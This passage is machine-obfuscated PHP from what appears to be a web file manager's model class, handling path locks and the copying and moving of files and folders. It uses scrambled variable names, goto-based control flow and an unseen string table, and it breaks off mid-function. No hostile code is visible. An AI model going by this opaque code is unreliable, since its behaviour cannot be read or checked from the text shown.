$bŠ™¡Œ¬Ô¢ = array_reverse($this->parentLevelArray($dğå¯Ïº¬‹[$_SERVER[Ä¿Ş°¨][463]])); foreach ($bŠ™¡Œ¬Ô¢ as $e±‡Èİß Ø) { $this->_lockEvent($e±‡Èİß Ø, $aÁÊ¤œ‚¼, $CÀÆ´ØÆ³‡); } } private function _lockEvent($c¡ãÅƒ‹šÙ, $CæÇÂ†ôâ, $b¨Á¿£é¡Š) { $C‰÷æÒİí =& $_SERVER[Ä¿Ş°¨]; if (!$this->autoLockSet) { return; } foreach ($CæÇÂ†ôâ as $BÕ†¹—íÀ) { $aêŒõÊ‘è = $BÕ†¹—íÀ . $C‰÷æÒİí[91] . $c¡ãÅƒ‹šÙ; if ($b¨Á¿£é¡Š && CacheLock::lockGet($C‰÷æÒİí[504] . $aêŒõÊ‘è)) { continue; } $this->_lockKey($aêŒõÊ‘è, $b¨Á¿£é¡Š); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($a±†ÙËÃôŠ, $d«¸ğ‹Â»Ó = 1) { $E…ïÜ×´ = $_SERVER[Ä¿Ş°¨][504] . md5($a±†ÙËÃôŠ); if ($d«¸ğ‹Â»Ó) { if (isset(self::$_lockItemArr[$E…ïÜ×´])) { return; } self::$_lockItemArr[$E…ïÜ×´] = 1; CacheLock::lock($E…ïÜ×´, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$E…ïÜ×´])) { return; } unset(self::$_lockItemArr[$E…ïÜ×´]); CacheLock::unlock($E…ïÜ×´); } } public function isParentOf($D·Çç¹ñá , $eñãß®Ì´Õ) { goto bÓóó±âæ¶; FßĞ•Û¸˜à: $bª´õŠŸ¬ˆ = $Bˆ ÷š‰‚[$a±¨Œ˜³×[463]] . $Bˆ ÷š‰‚[$a±¨Œ˜³×[374]] . $a±¨Œ˜³×[47]; $Bèà‚ì½áö = $cÀËöŸ‡ç[$a±¨Œ˜³×[463]] . $cÀËöŸ‡ç[$a±¨Œ˜³×[374]] . $a±¨Œ˜³×[47]; $Bù» òˆ©Õ = strpos($Bèà‚ì½áö, $bª´õŠŸ¬ˆ) === 0; goto eÍŠ‡·å´; eÍŠ‡·å´: return $Bù» òˆ©Õ; goto E†Ö·ù¾™¥; bÓóó±âæ¶: $a±¨Œ˜³× =& $_SERVER[Ä¿Ş°¨]; $Bˆ ÷š‰‚ = $this->sourceInfo($D·Çç¹ñá ); $cÀËöŸ‡ç = $this->sourceInfo($eñãß®Ì´Õ); goto FßĞ•Û¸˜à; E†Ö·ù¾™¥: } private $targetIsDelete = 0; public function copy($F×Óİ…‰Äë, $Cñ‚»ŞÌÊÚ, $F«®ä¯°´ = REPEAT_REPLACE, $d¬ìÖ©ä†ƒ = '') { goto E‚íœÆÌÈ; F²ÎÖ´èé‘: if (!$DÇ‰Ä öÛ» || !$aô¸Õƒ || $aô¸Õƒ[$bÀ’ù¢¥ÕÏ[375]] != $bÀ’ù¢¥ÕÏ[83]) { return !1; } if ($this->isParentOf($F×Óİ…‰Äë, $Cñ‚»ŞÌÊÚ)) { return !1; } $DìÓ¡£ù¤ã = $d¬ìÖ©ä†ƒ ? $d¬ìÖ©ä†ƒ : $DÇ‰Ä öÛ»[$bÀ’ù¢¥ÕÏ[28]]; goto d‡âÆÔ¦ùÙ; BË‘¾æìğö: $this->targetIsDelete = intval($DÇ‰Ä öÛ»[$bÀ’ù¢¥ÕÏ[401]]); $eèÄ¬¥áíÛ = $this->fileNameExistCache($Cñ‚»ŞÌÊÚ, $DÇ‰Ä öÛ»[$bÀ’ù¢¥ÕÏ[28]]); $f©„íò•Š = $this->_copy($F×Óİ…‰Äë, $Cñ‚»ŞÌÊÚ, $F«®ä¯°´, $b‡éã×ŠŠâ, !0, $d¬ìÖ©ä†ƒ); goto BÃÀÄá‡¿; C“ó¤³: $this->updateModifyTime($Cñ‚»ŞÌÊÚ); return $f©„íò•Š; goto BœÁæ¦Ú’ƒ; FïÍÅŠÜ½: if ($DÇ‰Ä öÛ»[$bÀ’ù¢¥ÕÏ[375]] == $bÀ’ù¢¥ÕÏ[83] && $eèÄ¬¥áíÛ == $f©„íò•Š) { $this->folderSizeResetChildren($eèÄ¬¥áíÛ); } Model($bÀ’ù¢¥ÕÏ[508])->addAll($b‡éã×ŠŠâ[$bÀ’ù¢¥ÕÏ[506]], array(), !0); if ($eèÄ¬¥áíÛ != $f©„íò•Š || $DÇ‰Ä öÛ»[$bÀ’ù¢¥ÕÏ[375]] == $bÀ’ù¢¥ÕÏ[83]) { Model($bÀ’ù¢¥ÕÏ[509])->eventCopy($f©„íò•Š); } goto e«—Ğ…Åª; BÃÀÄá‡¿: $this->_childrenListClear(); $this->lockCopyEnd($F×Óİ…‰Äë); $this->lockWriteEnd($Cñ‚»ŞÌÊÚ, $DìÓ¡£ù¤ã); goto FïÍÅŠÜ½; d‡âÆÔ¦ùÙ: $this->lockCopyStart($F×Óİ…‰Äë); $this->lockWriteStart($Cñ‚»ŞÌÊÚ, $DìÓ¡£ù¤ã); $b‡éã×ŠŠâ = array($bÀ’ù¢¥ÕÏ[505] => array(), $bÀ’ù¢¥ÕÏ[506] => array(), $bÀ’ù¢¥ÕÏ[507] => array()); goto BË‘¾æìğö; E‚íœÆÌÈ: $bÀ’ù¢¥ÕÏ =& $_SERVER[Ä¿Ş°¨]; $DÇ‰Ä öÛ» = $this->sourceInfo($F×Óİ…‰Äë); $aô¸Õƒ = $this->sourceInfo($Cñ‚»ŞÌÊÚ); goto F²ÎÖ´èé‘; e«—Ğ…Åª: $this->saveAll($b‡éã×ŠŠâ[$bÀ’ù¢¥ÕÏ[507]]); Model($bÀ’ù¢¥ÕÏ[163])->linkAdd($b‡éã×ŠŠâ[$bÀ’ù¢¥ÕÏ[505]]); $this->folderSizeReset($Cñ‚»ŞÌÊÚ); goto C“ó¤³; BœÁæ¦Ú’ƒ: } private function _copy($dÏ…çéÎ, $e¾±›ëÚÙÜ, $Cø©‚¸å, &$b›±Â½êà, $d¬†ºÇ½Ôê, $EÛ‰„¹°êœ = '') { goto EÎ¤’ŸÊŞµ; b¬÷ç«·Üõ: if (!$BÖˆÒ“¥µ) { return $this->_copyCreate($dÏ…çéÎ, $e¾±›ëÚÙÜ, $aÀ»ßÔ„È, $b›±Â½êà); } $E¦ÌÛ‹×Ç‰ = $BÖˆÒ“¥µ; if ($BÀÎÔŒÙàé) { if ($Cø©‚¸å == REPEAT_RENAME_FOLDER) { $aÀ»ßÔ„È = $this->fileNameAutoCache($e¾±›ëÚÙÜ, $aÀ»ßÔ„È, $Cø©‚¸å, $BÀÎÔŒÙàé); $E¦ÌÛ‹×Ç‰ = $this->_copyCreate($dÏ…çéÎ, $e¾±›ëÚÙÜ, $aÀ»ßÔ„È, $b›±Â½êà); } else { $b×êÙÙÌºê = $this->_childrenList($dÏ…çéÎ); foreach ($b×êÙÙÌºê as $f‡•ÑŞ¼¸†) { $this->_copy($f‡•ÑŞ¼¸†[$eâÓÉé‡È[374]], $BÖˆÒ“¥µ, $Cø©‚¸å, $b›±Â½êà, !1); } } } else { if ($Cø©‚¸å == REPEAT_RENAME || $Cø©‚¸å == REPEAT_RENAME_FOLDER) { $aÀ»ßÔ„È = $this->fileNameAutoCache($e¾±›ëÚÙÜ, $aÀ»ßÔ„È, $Cø©‚¸å, $BÀÎÔŒÙàé); $E¦ÌÛ‹×Ç‰ = $this->_copyCreate($dÏ…çéÎ, $e¾±›ëÚÙÜ, $aÀ»ßÔ„È, $b›±Â½êà); } else { if ($Cø©‚¸å == REPEAT_REPLACE) { $EÏŒ³â¹½ = $this->sourceInfoCache($BÖˆÒ“¥µ); $aÍŞĞìª÷ = $this->fileHistory($EÏŒ³â¹½, $Cß××éïÌ¹[$eâÓÉé‡È[423]], $Cß××éïÌ¹[$eâÓÉé‡È[77]]); if ($aÍŞĞìª÷) { $b›±Â½êà[$eâÓÉé‡È[505]][] = $Cß××éïÌ¹[$eâÓÉé‡È[423]]; } } else { if ($Cø©‚¸å == REPEAT_SKIP) { } } } Hook::trigger($eâÓÉé‡È[510], array($eâÓÉé‡È[511], $Cß××éïÌ¹, 0)); } goto EÎ’ò÷…·â; EÎ¤’ŸÊŞµ: $eâÓÉé‡È =& $_SERVER[Ä¿Ş°¨]; $Cß××éïÌ¹ = $this->sourceInfoCache($dÏ…çéÎ); $BÀÎÔŒÙàé = $Cß××éïÌ¹[$eâÓÉé‡È[375]] == $eâÓÉé‡È[83]; goto AÄ»°÷ƒ°¯; EÎ’ò÷…·â: return $E¦ÌÛ‹×Ç‰; goto a¡ŠÚôö²„; AÄ»°÷ƒ°¯: $aÀ»ßÔ„È = $EÛ‰„¹°êœ ? $EÛ‰„¹°êœ : $Cß××éïÌ¹[$eâÓÉé‡È[28]]; $BÖˆÒ“¥µ = $this->fileNameExistCache($e¾±›ëÚÙÜ, $aÀ»ßÔ„È); if ($d¬†ºÇ½Ôê) { $this->_childrenAllMake($dÏ…çéÎ); if ($BÀÎÔŒÙàé && $BÖˆÒ“¥µ) { $this->_childrenAllMake($BÖˆÒ“¥µ); } } goto b¬÷ç«·Üõ; a¡ŠÚôö²„: } private function _copyCreate($dª–Ò¶ÀÑ, $A‘–œºÁÖ, $b‘Éãš½è‚, &$EÃ¨ƒ™×Êõ) { goto Fõê´ëøî; BòŠÃ‡°é·: $B¶ŠÈ÷„’¨ = $this->add($DîçÛ¼Âä); $A¡×šŸé = array($E×¦îø£¸Å[374] => $B¶ŠÈ÷„’¨, $E×¦îø£¸Å[28] => $b‘Éãš½è‚); $this->_copyApplyMeta($A¡×šŸé, $EÃ¨ƒ™×Êõ); goto b†¶ìÌéó¨; b†¶ìÌéó¨: if ($E‡Û±”Àí[$E×¦îø£¸Å[375]] != $E×¦îø£¸Å[83]) { $EÃ¨ƒ™×Êõ[$E×¦îø£¸Å[505]][] = $E‡Û±”Àí[$E×¦îø£¸Å[423]]; return $B¶ŠÈ÷„’¨; } $b´×¼„ê’ˆ = array(); $AËºòì—ºè = array(); goto FôàÅò¡¤‡; FôàÅò¡¤‡: $this->_childrenListAll($dª–Ò¶ÀÑ, $b´×¼„ê’ˆ); $bØíŸ—ö«Ñ = count($b´×¼„ê’ˆ); if ($bØíŸ—ö«Ñ == 0) { return $B¶ŠÈ÷„’¨; } goto aÏØËÆ Ù ; E™²•ŒµÑ¯: $dÎÅ†Ê×ù×[$dª–Ò¶ÀÑ] = $B¶ŠÈ÷„’¨; $c‰Æƒ½Š = array(); $DÃÊïˆ…«È = array(); goto FÆ·‚ÂòîÂ; Fõê´ëøî: $E×¦îø£¸Å =& $_SERVER[Ä¿Ş°¨]; $E‡Û±”Àí = $this->sourceInfoCache($dª–Ò¶ÀÑ); $F´ë«¿¢¥ = $this->sourceInfoCache($A‘–œºÁÖ); goto fÕƒÛò½‰…; aÏØËÆ Ù : $E÷Ü…©¥ß = $this->sourceInfo($B¶ŠÈ÷„’¨); foreach ($b´×¼„ê’ˆ as $Aèğ¦ÌŞ«à) { $aÛ¹˜ÌïÇ = $this->_makeItemData($Aèğ¦ÌŞ«à, $E÷Ü…©¥ß, $Aèğ¦ÌŞ«à[$E×¦îø£¸Å[28]]); $aÛ¹˜ÌïÇ[$E×¦îø£¸Å[463]] = $Aèğ¦ÌŞ«à[$E×¦îø£¸Å[463]]; $AËºòì—ºè[] = $aÛ¹˜ÌïÇ; } $this->chunkEventSet($E×¦îø£¸Å[515], array($E×¦îø£¸Å[516], $DîçÛ¼Âä, $bØíŸ—ö«Ñ)); goto CÉùìğòÊ; CÉùìğòÊ: $this->addAll($AËºòì—ºè, array(), !1); $E˜¼Öªßç¦ = $this->where(array($E×¦îø£¸Å[465] => $B¶ŠÈ÷„’¨))->select(); $dÎÅ†Ê×ù× = $this->_childrenMakeRelation($b´×¼„ê’ˆ, $E˜¼Öªßç¦); goto E™²•ŒµÑ¯; fÕƒÛò½‰…: $DîçÛ¼Âä = $this->_makeItemData($E‡Û±”Àí, $F´ë«¿¢¥, $b‘Éãš½è‚); Hook::trigger($E×¦îø£¸Å[512], $DîçÛ¼Âä); Hook::trigger($E×¦îø£¸Å[513], array($E×¦îø£¸Å[514], $DîçÛ¼Âä, 0)); goto BòŠÃ‡°é·; FÆ·‚ÂòîÂ: foreach ($E˜¼Öªßç¦ as $Aèğ¦ÌŞ«à) { $B²†¡óñ†È = $Aèğ¦ÌŞ«à[$E×¦îø£¸Å[374]]; $A¶ğëËµÕœ = $this->_childrenMatch($dÎÅ†Ê×ù×, $Aèğ¦ÌŞ«à, $E÷Ü…©¥ß); $c‰Æƒ½Š[] = array($E×¦îø£¸Å[374], $B²†¡óñ†È, $E×¦îø£¸Å[465], $A¶ğëËµÕœ[$E×¦îø£¸Å[465]]); $DÃÊïˆ…«È[] = array($E×¦îø£¸Å[374], $B²†¡óñ†È, $E×¦îø£¸Å[463], $A¶ğëËµÕœ[$E×¦îø£¸Å[463]]); $this->_copyApplyMeta($Aèğ¦ÌŞ«à, $EÃ¨ƒ™×Êõ); if ($Aèğ¦ÌŞ«à[$E×¦îø£¸Å[375]] != $E×¦îø£¸Å[83]) { $EÃ¨ƒ™×Êõ[$E×¦îø£¸Å[505]][] = $Aèğ¦ÌŞ«à[$E×¦îø£¸Å[423]]; } } $this->chunkEventSet($E×¦îø£¸Å[517], array($E×¦îø£¸Å[518], $DîçÛ¼Âä, $bØíŸ—ö«Ñ)); $this->saveAll($c‰Æƒ½Š); goto FÊÃ£›¨¶Ê; FÊÃ£›¨¶Ê: $this->chunkEventSet($E×¦îø£¸Å[519], array($E×¦îø£¸Å[520], $DîçÛ¼Âä, $bØíŸ—ö«Ñ)); $this->saveAll($DÃÊïˆ…«È); return $B¶ŠÈ÷„’¨; goto f˜÷‰ÁÖÑ„; f˜÷‰ÁÖÑ„: } private function _childrenMakeRelation($Cê‚Ëèòº, $cÚ¿ŠØŒ‡) { $b„‚ÁÙÆó‡ =& $_SERVER[Ä¿Ş°¨]; $B…¢‹ã³äÂ = array(); $Cõˆîª¹œ£ = array(); foreach ($Cê‚Ëèòº as $Cß£”–Äò) { $eİİ¬Œ¤»à = $Cß£”–Äò[$b„‚ÁÙÆó‡[28]] . $b„‚ÁÙÆó‡[8] . $Cß£”–Äò[$b„‚ÁÙÆó‡[463]]; $B…¢‹ã³äÂ[$eİİ¬Œ¤»à] = $Cß£”–Äò[$b„‚ÁÙÆó‡[374]]; } foreach ($cÚ¿ŠØŒ‡ as $Cß£”–Äò) { $eİİ¬Œ¤»à = $Cß£”–Äò[$b„‚ÁÙÆó‡[28]] . $b„‚ÁÙÆó‡[8] . $Cß£”–Äò[$b„‚ÁÙÆó‡[463]]; $AÏ¤Õ†»¿î = $B…¢‹ã³äÂ[$eİİ¬Œ¤»à]; $Cõˆîª¹œ£[$AÏ¤Õ†»¿î] = $Cß£”–Äò[$b„‚ÁÙÆó‡[374]]; } return $Cõˆîª¹œ£; } private function _childrenMatch($BË”åöÓê«, $a‚éÚÕ½ Å, $C„íÍ•˜¡ˆ) { goto BŒéİ™ĞÀ«; A÷«Øáˆ·: foreach ($aöÃ‹ÁÇÏæ as $bêš‰ß–Ï§) { if (isset($BË”åöÓê«[$bêš‰ß–Ï§])) { $bĞèÅÂ±ÓÁ .= $BË”åöÓê«[$bêš‰ß–Ï§] . $FÙ¶¤ğ¹ÎÕ[521]; } } $bĞèÅÂ±ÓÁ = rtrim($bĞèÅÂ±ÓÁ, $FÙ¶¤ğ¹ÎÕ[47]) . $FÙ¶¤ğ¹ÎÕ[47]; $Eº²Èƒö„Ù = $this->parentLevelArray($bĞèÅÂ±ÓÁ); goto bº†¡›ªÕ³; BŒéİ™ĞÀ«: $FÙ¶¤ğ¹ÎÕ =& $_SERVER[Ä¿Ş°¨]; $bĞèÅÂ±ÓÁ = $C„íÍ•˜¡ˆ[$FÙ¶¤ğ¹ÎÕ[463]]; $aöÃ‹ÁÇÏæ = $this->parentLevelArray($a‚éÚÕ½ Å[$FÙ¶¤ğ¹ÎÕ[463]]); goto A÷«Øáˆ·; bº†¡›ªÕ³: $Fˆ²÷„È±È = $Eº²Èƒö„Ù[count($Eº²Èƒö„Ù) - 1]; return array($FÙ¶¤ğ¹ÎÕ[465] => $Fˆ²÷„È±È, $FÙ¶¤ğ¹ÎÕ[463] => $bĞèÅÂ±ÓÁ); goto c¦”Ì©¯×º; c¦”Ì©¯×º: } private function _makeItemData($cŒÍ’†İ½, $AŠ£©¿Š, $A¦©õŞÀŒ×) { $bŞÃ»‰ƒÏã =& $_SERVER[Ä¿Ş°¨]; $D«—ø„³ó = array($bŞÃ»‰ƒÏã[522] => $cŒÍ’†İ½[$bŞÃ»‰ƒÏã[375]], $bŞÃ»‰ƒÏã[391] => $A¦©õŞÀŒ×, $bŞÃ»‰ƒÏã[523] => $cŒÍ’†İ½[$bŞÃ»‰ƒÏã[377]], $bŞÃ»‰ƒÏã[424] => $cŒÍ’†İ½[$bŞÃ»‰ƒÏã[423]], $bŞÃ»‰ƒÏã[524] => $cŒÍ’†İ½[$bŞÃ»‰ƒÏã[77]], $bŞÃ»‰ƒÏã[525] => $AŠ£©¿Š[$bŞÃ»‰ƒÏã[376]], $bŞÃ»‰ƒÏã[526] => $AŠ£©¿Š[$bŞÃ»‰ƒÏã[460]], $bŞÃ»‰ƒÏã[527] => USER_ID, $bŞÃ»‰ƒÏã[528] => USER_ID, $bŞÃ»‰ƒÏã[373] => $AŠ£©¿Š[$bŞÃ»‰ƒÏã[374]], $bŞÃ»‰ƒÏã[529] => $AŠ£©¿Š[$bŞÃ»‰ƒÏã[463]] . $AŠ£©¿Š[$bŞÃ»‰ƒÏã[374]] . $bŞÃ»‰ƒÏã[47], $bŞÃ»‰ƒÏã[400] => 0, $bŞÃ»‰ƒÏã[530] => $bŞÃ»‰ƒÏã[33]); return $D«—ø„³ó; } private function _copyApplyMeta($Aæ¼•óá, &$B¿…ÜÈ„¿Œ) { $b¿äô¾‰İÍ =& $_SERVER[Ä¿Ş°¨]; $aÏõ±š—Î = $Aæ¼•óá[$b¿äô¾‰İÍ[374]]; $A–¸Û²–Í = $Aæ¼•óá[$b¿äô¾‰İÍ[28]]; if (!isset($Aæ¼•óá[$b¿äô¾‰İÍ[531]]) || !$Aæ¼•óá[$b¿äô¾‰İÍ[531]] || $Aæ¼•óá[$b¿äô¾‰İÍ[531]] == $b¿äô¾‰İÍ[472]) { $B¿…ÜÈ„¿Œ[$b¿äô¾‰İÍ[507]][] = array($b¿äô¾‰İÍ[374], $aÏõ±š—Î, $b¿äô¾‰İÍ[531], short_id($aÏõ±š—Î)); } if (Input::check($A–¸Û²–Í, $b¿äô¾‰İÍ[532])) { $B¿…ÜÈ„¿Œ[$b¿äô¾‰İÍ[506]][] = array($b¿äô¾‰İÍ[374] => $aÏõ±š—Î, $b¿äô¾‰İÍ[89] => $b¿äô¾‰İÍ[420], $b¿äô¾‰İÍ[355] => str_replace($b¿äô¾‰İÍ[50], $b¿äô¾‰İÍ[33], Pinyin::encode($A–¸Û²–Í))); $B¿…ÜÈ„¿Œ[$b¿äô¾‰İÍ[506]][] = array($b¿äô¾‰İÍ[374] => $aÏõ±š—Î, $b¿äô¾‰İÍ[89] => $b¿äô¾‰İÍ[419], $b¿äô¾‰İÍ[355] => Pinyin::encode($A–¸Û²–Í, $b¿äô¾‰İÍ[533])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($cñÖ’¸»à) { goto cÊÀÑëõïò; F Äšƒ¾ä: $e¤²‚¾ÇÉô = array_to_keyvalue($e¤²‚¾ÇÉô, $BÑöô‘öš[374]); foreach ($e¤²‚¾ÇÉô as $BĞãË¯‡õè) { $cµâŠ•­àê = $BĞãË¯‡õè[$BÑöô‘öš[465]]; $cñÖ’¸»à = $BĞãË¯‡õè[$BÑöô‘öš[374]]; if (!isset($this->_childrenListCache[$cñÖ’¸»à]) && $BĞãË¯‡õè[$BÑöô‘öš[375]] == $BÑöô‘öš[83]) { $this->_childrenListCache[$cñÖ’¸»à] = array(); } if (!isset($this->_childrenListCache[$cµâŠ•­àê])) { $this->_childrenListCache[$cµâŠ•­àê] = array(); } $this->_childrenListCache[$cµâŠ•­àê][$cñÖ’¸»à] = $BĞãË¯‡õè; $this->_childrenItemCache[$cñÖ’¸»à] = $BĞãË¯‡õè; } goto d¤¾§öæÖ; cÊÀÑëõïò: $BÑöô‘öš =& $_SERVER[Ä¿Ş°¨]; $AªàãÑœîÕ = $this->sourceInfo($cñÖ’¸»à); $CÃˆÇ‡òµ½ = $BÑöô‘öš[534]; goto DØĞ‹ŠÈ‰ô; DØĞ‹ŠÈ‰ô: $BåÁœòßÜå = array($BÑöô‘öš[463] => array($BÑöô‘öš[487], $AªàãÑœîÕ[$BÑöô‘öš[463]] . $cñÖ’¸»à . $BÑöô‘öš[488]), $BÑöô‘öš[401] => $this->targetIsDelete); $e¤²‚¾ÇÉô = $this->field($CÃˆÇ‡òµ½)->where($BåÁœòßÜå)->select(); if (!$e¤²‚¾ÇÉô) { return; } goto F Äšƒ¾ä; d¤¾§öæÖ: } private function _childrenListAll($A‰Ìè«íÀ—, &$aµÕ¶½×½¨) { $eİ‹öï¹áÖ =& $_SERVER[Ä¿Ş°¨]; if (!isset($this->_childrenListCache[$A‰Ìè«íÀ—])) { return; } $Cïˆ¼ŒœÖ‡ = $this->_childrenListCache[$A‰Ìè«íÀ—]; foreach ($Cïˆ¼ŒœÖ‡ as $EÚÔ¯‹‘ËÏ => $cõâÃ¨î½é) { $aµÕ¶½×½¨[$EÚÔ¯‹‘ËÏ] = $cõâÃ¨î½é; if ($cõâÃ¨î½é[$eİ‹öï¹áÖ[375]] == $eİ‹öï¹áÖ[83]) { $this->_childrenListAll($EÚÔ¯‹‘ËÏ, $aµÕ¶½×½¨); } } } private function sourceInfoCache($DÏº¨Àè’) { if (isset($this->_childrenItemCache[$DÏº¨Àè’])) { return $this->_childrenItemCache[$DÏº¨Àè’]; } return $this->sourceInfo($DÏº¨Àè’); } private function _childrenList($b«©®‰óğ–) { if (isset($this->_childrenListCache[$b«©®‰óğ–])) { return $this->_childrenListCache[$b«©®‰óğ–]; } return $this->_childrenListSelect($b«©®‰óğ–); } private function _childrenListSelect($bœÅØ·Û—Ä) { goto CÎ´¯â÷Çç; EàÖî¥¢«„: foreach ($bÂ‹íùÊ…Ì as $bœÅØ·Û—Ä => $dÎÀæ®Ë±) { $this->_childrenItemCache[$bœÅØ·Û—Ä] = $dÎÀæ®Ë±; } return $bÂ‹íùÊ…Ì; goto FÛ‰Ì©å¼; CÎ´¯â÷Çç: $C°¸ŠÌ›Ô =& $_SERVER[Ä¿Ş°¨]; $D•‘”¢Á¯ = array($C°¸ŠÌ›Ô[465] => $bœÅØ·Û—Ä, $C°¸ŠÌ›Ô[401] => $this->targetIsDelete); $bÁà±åáˆÌ = $this->where($D•‘”¢Á¯)->select(); goto c¹Ù‡ãƒ­; c¹Ù‡ãƒ­: $bÁà±åáˆÌ = $bÁà±åáˆÌ ? $bÁà±åáˆÌ : array(); $bÂ‹íùÊ…Ì = array_to_keyvalue($bÁà±åáˆÌ, $C°¸ŠÌ›Ô[374]); $this->_childrenListCache[$bœÅØ·Û—Ä] = $bÂ‹íùÊ…Ì; goto EàÖî¥¢«„; FÛ‰Ì©å¼: } private function fileNameExistCache($dÔŞÈÊ•°, $cÜ¦–ìØ²¶) { $Aºô…»ğ˜ß =& $_SERVER[Ä¿Ş°¨]; $cÜ¦–ìØ²¶ = strtolower($cÜ¦–ìØ²¶); $CÙ¡õÇÁ = $this->_childrenList($dÔŞÈÊ•°); foreach ($CÙ¡õÇÁ as $B Ÿñ–š) { if ($cÜ¦–ìØ²¶ == strtolower($B Ÿñ–š[$Aºô…»ğ˜ß[28]])) { return $B Ÿñ–š[$Aºô…»ğ˜ß[374]]; } } return !1; } private function fileNameAutoCache($b¬­”±°Şç, $e¦‰¯¥Š‚÷, $b÷²‰Òæö¡, $Aïîéè‰ã¼) { $eÀœÂ ªÙè =& $_SERVER[Ä¿Ş°¨]; $B‡ÚåµÆÁº = $this->_childrenList($b¬­”±°Şç); $d†Ìí”†”í = array_to_keyvalue($B‡ÚåµÆÁº, $eÀœÂ ªÙè[33], $eÀœÂ ªÙè[28]); return $this->fileNameAutoGet($d†Ìí”†”í, $e¦‰¯¥Š‚÷, $b÷²‰Òæö¡, $Aïîéè‰ã¼); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Eâ…¡ƒğ¹ï, $F‹ÆÏĞŸİË, $bÏµ˜ÖŞ±¤ = REPEAT_REPLACE, $B¯Š¶Õ²™ = '') { goto b±×àëÖŒ; F¾¤•âóé: $f°º×æ£À = array($B«’Ì‰­[$b·Øè›ó£‘[465]], $F‹ÆÏĞŸİË); if ($B«’Ì‰­[$b·Øè›ó£‘[375]] == $b·Øè›ó£‘[83]) { $f°º×æ£À[] = $Eâ…¡ƒğ¹ï; } $this->updateModifyTime($f°º×æ£À); goto D°¸ö•£¬; b±×àëÖŒ: $b·Øè›ó£‘ =& $_SERVER[Ä¿Ş°¨]; $B«’Ì‰­ = $this->sourceInfo($Eâ…¡ƒğ¹ï); $F»§¬°¶¦é = $this->sourceInfo($F‹ÆÏĞŸİË); goto CÀ±ëê²ìŞ; c±ï•õÄ©‚: $eèÃŠÀÇô = $B¯Š¶Õ²™ ? $B¯Š¶Õ²™ : $B«’Ì‰­[$b·Øè›ó£‘[28]]; $this->lockMoveStart($Eâ…¡ƒğ¹ï); $this->lockWriteStart($F‹ÆÏĞŸİË, $eèÃŠÀÇô); goto cËËËÕ’Åø; cËËËÕ’Åø: $BŸÊÍß½Ê— = array($b·Øè›ó£‘[505] => array(), $b·Øè›ó£‘[537] => !1); $this->clearShare($Eâ…¡ƒğ¹ï, $F‹ÆÏĞŸİË); $dÆ¯›‹âÈî = $this->fileNameExistCache($F‹ÆÏĞŸİË, $B«’Ì‰­[$b·Øè›ó£‘[28]]); goto F°¥ß›Àä¶; fÆøÑËŸá: Model($b·Øè›ó£‘[163])->linkAdd($BŸÊÍß½Ê—[$b·Øè›ó£‘[505]]); if ($dÆ¯›‹âÈî && $BŸÊÍß½Ê—[$b·Øè›ó£‘[537]]) { $this->removeNow($Eâ…¡ƒğ¹ï, !1); } $this->lockMoveEnd($Eâ…¡ƒğ¹ï); goto dù“ÈƒŒ©â; D°¸ö•£¬: Model($b·Øè›ó£‘[509])->eventMove($Eâ…¡ƒğ¹ï, $B«’Ì‰­[$b·Øè›ó£‘[465]], $F‹ÆÏĞŸİË); Hook::trigger($b·Øè›ó£‘[536], $b›‰ŞƒÃ‚â); return $a¬£Ü›ÑÀ; goto Dß™ÙÚ‚ó; dù“ÈƒŒ©â: $this->lockWriteEnd($F‹ÆÏĞŸİË, $eèÃŠÀÇô); $this->folderSizeReset($B«’Ì‰­[$b·Øè›ó£‘[465]]); $this->folderSizeReset($F‹ÆÏĞŸİË); goto F¾¤•âóé; F°¥ß›Àä¶: $a¬£Ü›ÑÀ = $this->_move($Eâ…¡ƒğ¹ï, $F‹ÆÏĞŸİË, $bÏµ˜ÖŞ±¤, $BŸÊÍß½Ê—, $B¯Š¶Õ²™); $this->sourceCacheClear(); if ($B«’Ì‰­[$b·Øè›ó£‘[375]] == $b·Øè›ó£‘[83] && $dÆ¯›‹âÈî) { $this->folderSizeResetChildren($a¬£Ü›ÑÀ); } goto fÆøÑËŸá; cùâœ®ˆÑ: Hook::trigger($b·Øè›ó£‘[535], $b›‰ŞƒÃ‚â); $this->targetIsDelete = intval($B«’Ì‰­[$b·Øè›ó£‘[401]]); if ($B«’Ì‰­[$b·Øè›ó£‘[465]] == $F‹ÆÏĞŸİË && $B¯Š¶Õ²™ != $B«’Ì‰­[$b·Øè›ó£‘[28]]) { $aä—©Ù×®Ô = $this->fileNameExist($F‹ÆÏĞŸİË, $B¯Š¶Õ²™); if ($aä—©Ù×®Ô && $B«’Ì‰­[$b·Øè›ó£‘[375]] == $b·Øè›ó£‘[472]) { goto eƒªùæ‰…¨; e”ŸÇñí: $this->removeNow($Eâ…¡ƒğ¹ï, !1); $this->folderSizeReset($F‹ÆÏĞŸİË); Hook::trigger($b·Øè›ó£‘[536], $b›‰ŞƒÃ‚â); goto b´ ¬ÊÈ; eƒªùæ‰…¨: $bÕ­Ñ±Ï™í = $this->sourceInfo($aä—©Ù×®Ô); $f¼Ì—°÷ = $this->fileHistory($bÕ­Ñ±Ï™í, $B«’Ì‰­[$b·Øè›ó£‘[423]], $B«’Ì‰­[$b·Øè›ó£‘[77]]); if (!$f¼Ì—°÷) { Model($b·Øè›ó£‘[426])->remove($B«’Ì‰­[$b·Øè›ó£‘[423]]); } goto e”ŸÇñí; b´ ¬ÊÈ: return $aä—©Ù×®Ô; goto cØ÷ïøÂè½; cØ÷ïøÂè½: } } goto c±ï•õÄ©‚; CÀ±ëê²ìŞ: $b›‰ŞƒÃ‚â = $this->pathInfoMore($Eâ…¡ƒğ¹ï); if ($this->isParentOf($Eâ…¡ƒğ¹ï, $F‹ÆÏĞŸİË)) { return !1; } if (!$B«’Ì‰­ || !$F»§¬°¶¦é || $F»§¬°¶¦é[$b·Øè›ó£‘[375]] != $b·Øè›ó£‘[83]) { return !1; } goto cùâœ®ˆÑ; Dß™ÙÚ‚ó: } private function _move($Bä¿ŠÔ‡éá, $AÚÑé£ÎÈ², $FšÍ¢ò¹¸À, &$a‹©é´‘Æ‰, $D¼½ô‰×ÜŞ = '') { goto EÕß‡’‘†; F¥ÎÕİÍ: $this->lockWriteStart($AÚÑé£ÎÈ², $b„©íÂÊ÷•); if (!$e½¥¸·Ã°ñ) { return 